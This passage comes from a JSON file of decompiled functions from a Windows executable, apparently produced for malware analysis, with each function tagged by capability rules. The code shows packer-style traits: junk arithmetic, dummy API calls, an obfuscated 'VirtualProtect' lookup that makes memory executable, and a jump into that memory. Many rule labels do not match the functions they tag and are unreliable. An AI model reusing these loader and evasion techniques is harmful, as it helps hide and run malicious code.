-0x84) = *(unaff_EBP + -0x84) + -0x6552ee2b;\n            *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + -0x37b2dded;\n            *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + 0x5e3deeac;\n            *(unaff_EBP + -0x198) = *(unaff_EBP + -0x198) + -0x6e96bb1;\n            *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 0x4754349c;\n            *(unaff_EBP + -0x1bc) = *(unaff_EBP + -0x1bc) + 0x6f1793e3;\n            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -0x4786a3b4;\n            *(unaff_EBP + -0x90) = *(unaff_EBP + -0x90) + 0x4e4d62fa;\n            *(unaff_EBP + -0xe0) = *(unaff_EBP + -0xe0) + 0x1fd8336a;\n            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) + 0x2f5d8aa6;\n            *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + 0x7f8ccb0c;\n            *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + -0x245bfa06;\n            *(unaff_EBP + -0x24) = *(unaff_EBP + -0x24) + 0x18ec3b97;\n            *(unaff_EBP + -0x134) = *(unaff_EBP + -0x134) + -0x4610596e;\n            *(unaff_EBP + -0xd8) = *(unaff_EBP + -0xd8) + 0xa4a17f0;\n            *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + -0x2265f1d9;\n            *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + 0x2c11eb6d;\n            *(unaff_EBP + -0x180) = *(unaff_EBP + -0x180) + 0x72527571;\n            *(unaff_EBP + -0x94) = *(unaff_EBP + -0x94) + 0x69e61aa0;\n            *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + -0x7e3ea839;\n            *(unaff_EBP + -0x160) = *(unaff_EBP + -0x160) + 0xd450c65;\n            *(unaff_EBP + -0x128) = *(unaff_EBP + -0x128) + 0x3ed91901;\n            *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x50b57cb8;\n            *(unaff_EBP + -400) = *(unaff_EBP + -400) + 0x3dc32ae1;\n            *(unaff_EBP + -0x1c0) = *(unaff_EBP + -0x1c0) + -0x17b3bba3;\n            *(unaff_EBP + -0x130) = *(unaff_EBP + -0x130) + -0x21bf08cd;\n            *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + 0x797009a5;\n            *(unaff_EBP + -0x90) = *(unaff_EBP + -0x90) + 0x16f0f119;\n            *(unaff_EBP + -0x180) = *(unaff_EBP + -0x180) + 0x5a6efe42;\n            *(unaff_EBP + -0x124) = *(unaff_EBP + -0x124) + -0x1ec972e;\n            *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + -0x5d2e3c57;\n            *(unaff_EBP + -0x1e8) = *(unaff_EBP + -0x1e8) + 0x2f6bf32b;\n            *(unaff_EBP + -0xf8) = *(unaff_EBP + -0xf8) + -0x11f2124b;\n            *(unaff_EBP + -0x40) = *(unaff_EBP + -0x40) + 0x1c897e;\n            *(unaff_EBP + -0xd8) = *(unaff_EBP + -0xd8) + -0x8f99ce5;\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + -0x20116b3d;\n            *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + 0x4db5ae9d;\n            *(unaff_EBP + -0x84) = *(unaff_EBP + -0x84) + 0x63051de;\n            *(unaff_EBP + -0xc4) = *(unaff_EBP + -0xc4) + -0x1cb0f6f6;\n            *(unaff_EBP + -0xd4) = *(unaff_EBP + -0xd4) + -0x554222f6;\n            *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + 0x35ae4ec;\n            *(unaff_EBP + -0x68) = *(unaff_EBP + -0x68) + -0x5d9447e5;\n            *(unaff_EBP + -0x88) = *(unaff_EBP + -0x88) + 0x2fc5a2b;\n            *(unaff_EBP + -0x1e8) = *(unaff_EBP + -0x1e8) + 0x6407bf56;\n            *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + -0x5fa52eba;\n            *(unaff_EBP + -0x160) = *(unaff_EBP + -0x160) + 0x3af07d00;\n            *(unaff_EBP + -300) = *(unaff_EBP + -300) + 0x72713cd9;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 0x29d27d71;\n            *(unaff_EBP + -0x68) = *(unaff_EBP + -0x68) + 0x5d5437a4;\n            *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -0x76a86887;\n            *(unaff_EBP + -0x100) = *(unaff_EBP + -0x100) + 0x496ce873;\n            *(unaff_EBP + -0x98) = *(unaff_EBP + -0x98) + -0x265bf0f8;\n            *(unaff_EBP + -0x168) = *(unaff_EBP + -0x168) + -0x4940f92e;\n            *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + 0x435ee23f;\n            *(unaff_EBP + -0x1c8) = *(unaff_EBP + -0x1c8) + 0x6c0957e7;\n            *(unaff_EBP + -0x104) = *(unaff_EBP + -0x104) + 0x15c52a01;\n            *(unaff_EBP + -0x17c) = *(unaff_EBP + -0x17c) + 0x6ac57952;\n            *(unaff_EBP + -0xe4) = *(unaff_EBP + -0xe4) + -0x8480865;\n            *(unaff_EBP + -0xd8) = *(unaff_EBP + -0xd8) + 0x1c849185;\n            *(unaff_EBP + -0x15c) = *(unaff_EBP + -0x15c) + 0x5621e93a;\n            *(unaff_EBP + -0xdc) = *(unaff_EBP + -0xdc) + 0xfc674c;\n            *(unaff_EBP + -0x11c) = *(unaff_EBP + -0x11c) + 0x68955fb6;\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + -0x60620f31;\n            *(unaff_EBP + -0x1d0) = *(unaff_EBP + -0x1d0) + -0x470455c;\n            *(unaff_EBP + -0x1b0) = *(unaff_EBP + -0x1b0) + -0x4b822ea7;\n            *(unaff_EBP + -0x138) = *(unaff_EBP + -0x138) + 0x26a5b847;\n            *(unaff_EBP + -0x168) = *(unaff_EBP + -0x168) + -0x5d516951;\n            *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x4c) + 0x3fbe415b;\n            *(unaff_EBP + -0x13c) = *(unaff_EBP + -0x13c) + 0x1776714d;\n            *(unaff_EBP + -0xf0) = *(unaff_EBP + -0xf0) + 0x1d5ad29b;\n            *(unaff_EBP + -0x48) = *(unaff_EBP + -0x48) + 0x757996d7;\n            *(unaff_EBP + -0x14c) = *(unaff_EBP + -0x14c) + 0x7e4ab5bf;\n            *(unaff_EBP + -0x114) = *(unaff_EBP + -0x114) + 0x78263a12;\n            *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + -0x2a267df8;\n            *(unaff_EBP + -0xa0) = *(unaff_EBP + -0xa0) + 0x1368ace2;\n            *(unaff_EBP + -0x50) = *(unaff_EBP + -0x50) + -0x17087538;\n            *(unaff_EBP + -200) = *(unaff_EBP + -200) + 0xbecb6fc;\n            *(unaff_EBP + -0x15c) = *(unaff_EBP + -0x15c) + 0x40633d31;\n            *(unaff_EBP + -0xfc) = *(unaff_EBP + -0xfc) + 0x5db10c0e;\n        }\n        (*_sym.imp.KERNEL32.dll_GetGeoInfoA)(0, 0, 0, 0, 0);\n    } while ((*(unaff_EBP + -0x14) < 0x242696) &&\n            (*(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 1,  *(unaff_EBP + -0x14) < 0x15a2287c));\n    *(unaff_EBP + -0x14) = 0x4f4;\n    do {\n        (*_sym.imp.USER32.dll_GetListBoxInfo)(0);\n        (*_sym.imp.USER32.dll_LoadMenuA)(0, 0);\n        piVar1 = unaff_EBP + -0x14;\n        *piVar1 = *piVar1 + -1;\n    } while (*piVar1 != 0);\n    fcn.00403506();\n    iVar5 = 0;\n    do {\n        if (iVar5 == 0xbde) {\n            fcn.00403585();\n            iVar5 = extraout_ECX;\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x409495);\n    *(unaff_EBP + -0x14) = 0x7b;\n    do {\n        if (*0x814254 == 0x86) {\n            (*_sym.imp.KERNEL32.dll_AddAtomA)(0);\n        }\n        piVar1 = unaff_EBP + -0x14;\n        *piVar1 = *piVar1 + -1;\n    } while (*piVar1 != 0);\n    *(unaff_EBP + -0x14) = 0x180ee;\n    do {\n        if (*0x814254 == 0x1f) {\n            (*pcVar2)(0, 0);\n            (*pcVar3)();\n            (*_sym.imp.KERNEL32.dll_GetComputerNameA)(unaff_EBP + -0xe1c, unaff_EBP + -0x1c8);\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesW)(0, 0);\n            (*_sym.imp.KERNEL32.dll_IsProcessInJob)(0, 0, 0);\n        }\n        piVar1 = unaff_EBP + -0x14;\n        *piVar1 = *piVar1 + -1;\n    } while (*piVar1 != 0);\n    fcn.00403304();\n    *0x814248 = *0x812e30;\n    (**0x812e30)();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 11464
    },
    "0040329e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint * __cdecl fcn.0040329e(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00410db4();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.004056d7(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = 0x40120c;\n    fcn.00404909(arg_8h_00 + 0xc);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 249
    },
    "00403364": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403364(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 45
    },
    "0040336b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040336b(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 48
    },
    "00403585": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403585(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 23
    },
    "004035b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.004035b3(void)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    *0x812e34 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x402d40);\n    *0x7fe1f0 = 0x56;\n    *0x7fe1f1 = 0x69;\n    *0x7fe1f2 = 0x72;\n    *0x7fe1f7 = 0x50;\n    *0x7fe1fd = 0x74;\n    *0x7fe1fe = 0;\n    *0x7fe1f3 = 0x74;\n    *0x7fe1f4 = 0x75;\n    *0x7fe1f5 = 0x61;\n    *0x7fe1f6 = 0x6c;\n    *0x7fe1f8 = 0x72;\n    *0x7fe1f9 = 0x6f;\n    *0x7fe1fa = 0x74;\n    *0x7fe1fb = 0x65;\n    *0x7fe1fc = 99;\n    *0x812e28 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x812e34, 0x7fe1f0);\n    var_4h = 0x40;\n    (**0x812e28)(*0x812e30, *0x814254, 0x40, &var_8h);\n    return;\n}\n",
        "token_count": 352
    },
    "004049fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004049fa(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint arg_ch_00;\n    uint32_t arg_14h;\n    \n    uVar2 = fcn.00404939();\n    if (uVar2 < arg_ch) {\n        fcn.004055a4();\n    }\n    iVar3 = fcn.00404939();\n    uVar2 = iVar3 - arg_ch;\n    if (arg_10h < iVar3 - arg_ch) {\n        uVar2 = arg_10h;\n    }\n    if (in_ECX == arg_8h) {\n        fcn.00404c59(uVar2 + arg_ch, 0xffffffff);\n        fcn.00404c59(0, arg_ch);\n    }\n    else {\n        cVar1 = fcn.00404cdf(uVar2, 0);\n        if (cVar1 != '\\0') {\n            arg_14h = uVar2;\n            iVar3 = fcn.00404aeb();\n            iVar3 = iVar3 + arg_ch;\n            arg_ch_00 = *(in_ECX + 0x18);\n            arg_8h_00 = fcn.00404d41();\n            fcn.004051a0(arg_8h_00, arg_ch_00, iVar3, arg_14h);\n            fcn.00404cb8(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 363
    },
    "00404c59": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00404c59(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t arg_14h;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    \n    if (*(param_1 + 0x14) < param_2) {\n        fcn.004055a4();\n    }\n    uVar1 = *(param_1 + 0x14) - param_2;\n    if (uVar1 < param_3) {\n        param_3 = uVar1;\n    }\n    if (param_3 != 0) {\n        arg_14h = uVar1 - param_3;\n        iVar2 = fcn.00404d41();\n        iVar2 = iVar2 + param_2 + param_3;\n        arg_ch = *(param_1 + 0x18) - param_2;\n        iVar3 = fcn.00404d41();\n        fcn.004051f1(iVar3 + param_2, arg_ch, iVar2, arg_14h);\n        fcn.00404cb8(*(param_1 + 0x14) - param_3);\n    }\n    return param_1;\n}\n",
        "token_count": 289
    },
    "00404cb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00404cb8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_1h;\n    \n    *(in_ECX + 0x14) = arg_8h;\n    iVar1 = fcn.00404d41(&var_1h);\n    fcn.00403161(iVar1 + arg_8h);\n    return;\n}\n",
        "token_count": 113
    },
    "004050ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004050ff(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((param_2 != 0) && (in_EAX = fcn.00404d41(),  in_EAX <= param_2)) {\n        iVar1 = fcn.00404d41();\n        in_EAX = iVar1 + *(param_1 + 0x14);\n        if (param_2 < in_EAX) {\n            return CONCAT31(in_EAX >> 8, 1);\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 150
    },
    "0040515a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040515a(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    \n    cVar2 = fcn.004031de();\n    if (cVar2 == '\\0') {\n        fcn.00405b38();\n    }\n    uVar1 = *(unaff_ESI + 4) + param_1 * 4;\n    iVar3 = fcn.004031c6();\n    if (uVar1 < *(iVar3 + 0x10) || uVar1 == *(iVar3 + 0x10)) {\n        iVar3 = fcn.004031c6();\n        if (*(iVar3 + 0xc) <= uVar1) goto code_r0x00405196;\n    }\n    fcn.00405b38();\ncode_r0x00405196:\n    *(unaff_ESI + 4) = *(unaff_ESI + 4) + param_1 * 4;\n    return;\n}\n",
        "token_count": 234
    },
    "00405239": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00405239(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint32_t arg_14h;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint32_t var_9h;\n    uint32_t var_5h;\n    uint var_1h;\n    \n    var_5h = var_5h & 0xffffff00;\n    uVar1 = fcn.004053cf();\n    var_9h = var_9h & 0xffffff00 | uVar1;\n    puVar2 = fcn.004053ce(var_9h, var_5h);\n    arg_14h = *puVar2;\n    arg_ch_00 = fcn.004053ae();\n    arg_8h_00 = fcn.004053ae();\n    fcn.004053d6(arg_8h_00, arg_ch_00, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 253
    },
    "00405321": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405321(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.0040317f(param_1, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 57
    },
    "00405343": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405343(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.00405407(param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 47
    },
    "0040535a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040535a(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.0040319b(param_1, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 58
    },
    "004053ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004053ba(uint *param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    \n    for (; in_EAX != param_1; in_EAX = in_EAX + 1) {\n        *in_EAX = *param_2;\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "004053d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004053d6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uchar uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040533c();\n    fcn.0040544d(arg_8h, arg_14h, uVar1, 0);\n    return;\n}\n",
        "token_count": 97
    },
    "00405407": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00405407(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    unkuint3 in_ECX;\n    uint var_5h;\n    uint var_1h;\n    \n    fcn.00405475(in_ECX << 8);\n    fcn.00405476(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 104
    },
    "0040544d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040544d(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = in_EAX - param_2 >> 2;\n    param_1 = param_1 + iVar1 * -4;\n    if (0 < iVar1) {\n        fcn.004055f9(param_1, iVar1 * 4, param_2, iVar1 * 4);\n    }\n    return param_1;\n}\n",
        "token_count": 121
    },
    "00405476": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405476(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.004053ae(arg_ch, arg_10h, 0);\n    fcn.004054db();\n    return;\n}\n",
        "token_count": 65
    },
    "004054f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004054f4(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t arg_ch;\n    \n    iVar1 = in_EAX - param_3 >> 2;\n    arg_ch = iVar1 * 4;\n    if (iVar1 != 0) {\n        fcn.004055f9(param_2, arg_ch, param_3, arg_ch);\n    }\n    return arg_ch + param_2;\n}\n",
        "token_count": 125
    },
    "004076e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004076e1(uint arg_8h)\n\n{\n    fcn.004075b5(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00408ae8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408afc)\n// WARNING: Removing unreachable block (ram,0x00408b02)\n// WARNING: Removing unreachable block (ram,0x00408b04)\n\nvoid fcn.00408ae8(void)\n\n{\n    return;\n}\n",
        "token_count": 63
    },
    "00405fe2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405fe2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040977d(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "004049a2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004049a2(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint var_14h;\n    uint var_ch;\n    \n    uVar1 = fcn.00404b01();\n    uVar2 = fcn.00404b2d();\n    if (uVar2 < uVar1) {\n        uVar3 = fcn.00404bb8(arg_8h);\n        *(in_EAX + 0x10) = uVar3;\n    }\n    else {\n        puVar4 = fcn.00404b14(&var_ch);\n        fcn.00404b37(&var_14h, arg_8h, *puVar4, puVar4[1]);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00404b90": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint32_t fcn.00404b90(void)\n\n{\n    uint32_t in_EAX;\n    \n    *(in_EAX + 0xc) = 0;\n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0;\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 79
    },
    "00404b9e": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404b9e(void)\n\n{\n    int32_t unaff_ESI;\n    \n    if (*(unaff_ESI + 0xc) != 0) {\n        fcn.00404f27(*(unaff_ESI + 0xc));\n    }\n    *(unaff_ESI + 0xc) = 0;\n    *(unaff_ESI + 0x10) = 0;\n    *(unaff_ESI + 0x14) = 0;\n    return;\n}\n",
        "token_count": 111
    },
    "0040316e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040316e(char *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    \n    pcVar1 = param_1 + 1;\n    do {\n        cVar2 = *param_1;\n        param_1 = param_1 + 1;\n    } while (cVar2 != '\\0');\n    return param_1 - pcVar1;\n}\n",
        "token_count": 91
    },
    "00408046": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408046(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040777c(0x411080, 0xc);\n    fcn.00409d38(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x7fd6b0;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x7fd6ac;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040808a;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.004068fb(arg_8h_00);\ncode_r0x0040808a:\n        fcn.004068fb(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004080ad();\n    fcn.004077c1();\n    return;\n}\n",
        "token_count": 395
    }
}